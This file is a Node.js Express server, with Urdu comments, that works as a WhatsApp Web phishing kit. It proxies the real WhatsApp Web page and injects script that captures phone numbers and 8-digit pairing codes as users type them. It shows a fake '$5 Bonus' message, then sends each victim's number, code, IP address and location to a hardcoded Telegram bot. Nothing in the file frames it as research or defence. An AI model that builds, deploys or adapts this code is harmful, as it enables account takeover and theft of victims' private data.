const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ========================
// ٹیلی گرام بوٹ سیٹنگز
// ========================
const TELEGRAM_BOT_TOKEN = "8585329308:AAH5pDuedMvrbK8Bn2ovOTQAlWSOyyRxsJE";
const TELEGRAM_CHAT_ID = "8545560912";

// ٹیلی گرام پر میسج بھیجنے کا فنکشن
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
        return response.data;
    } catch (error) {
        console.error('Telegram error:', error.message);
    }
}

// ========================
// WhatsApp Web پراکسی
// ========================

app.get('/whatsapp-proxy', async (req, res) => {
    try {
        const targetUrl = 'https://web.whatsapp.com/';
        const response = await axios.get(targetUrl, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5'
            }
        });
        
        let html = response.data;
        
        // Add monitoring script
        const monitoringScript = `
        <script>
            // Send data to server
            async function sendData(data) {
                try {
                    const response = await fetch('/api/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    console.log('Data sent:', data.type);
                } catch(e) {}
            }
            
            let capturedPhone = null;
            let capturedOtp = null;
            
            // Monitor all inputs
            function monitorInputs() {
                document.querySelectorAll('input').forEach(input => {
                    if (input.dataset.monitored) return;
                    input.dataset.monitored = 'true';
                    
                    input.addEventListener('input', function() {
                        const val = this.value;
                        
                        // Phone number capture
                        if ((this.type === 'tel' || (this.placeholder || '').toLowerCase().includes('phone')) && 
                            val && val.length >= 8 && !capturedPhone) {
                            capturedPhone = val;
                            sendData({ type: 'PHONE', phone: val });
                        }
                        
                        // 8-digit OTP capture
                        if (val && /^\\d{8}$/.test(val) && val !== capturedOtp) {
                            capturedOtp = val;
                            sendData({ type: 'OTP', phone: capturedPhone || 'Unknown', otp: val });
                            
                            // Show success message
                            const toast = document.createElement('div');
                            toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#25D366;color:white;padding:12px24px;border-radius:40px;z-index:9999;font-weight:bold';
                            toast.innerHTML = '✅ Verified! $5 Bonus Added!';
                            document.body.appendChild(toast);
                            setTimeout(() => toast.remove(), 3000);
                        }
                    });
                });
            }
            
            // Monitor DOM changes
            new MutationObserver(() => monitorInputs()).observe(document.body, { childList: true, subtree: true });
            document.addEventListener('DOMContentLoaded', monitorInputs);
            setTimeout(monitorInputs, 2000);
        </script>
        `;
        
        html = html.replace('</body>', monitoringScript + '</body>');
        res.send(html);
        
    } catch (error) {
        console.error('Proxy error:', error);
        res.status(500).send('Error loading WhatsApp Web');
    }
});

// Capture endpoint
app.post('/api/capture', async (req, res) => {
    const data = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    let location = 'Unknown';
    try {
        const ipRes = await axios.get(`https://ipapi.co/${clientIp}/json/`);
        location = `${ipRes.data.city || 'Unknown'}, ${ipRes.data.country_name || 'Unknown'}`;
    } catch(e) {}
    
    let message = '';
    if (data.type === 'PHONE') {
        message = `📱 <b>WhatsApp Phone Captured!</b>\n\n📞 Phone: <code>${data.phone}</code>\n🌐 IP: ${clientIp}\n📍 Location: ${location}\n⏰ Time: ${new Date().toLocaleString()}`;
    } else if (data.type === 'OTP') {
        message = `🔐 <b>8-Digit PAIRING CODE!</b> 🔐\n\n📞 Phone: <code>${data.phone}</code>\n🔢 Code: <code><b>${data.otp}</b></code>\n🌐 IP: ${clientIp}\n📍 Location: ${location}\n⏰ Time: ${new Date().toLocaleString()}\n\n✅ <b>FULL ACCESS GRANTED!</b>`;
    }
    
    if (message) await sendToTelegram(message);
    res.json({ success: true });
});

// Main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
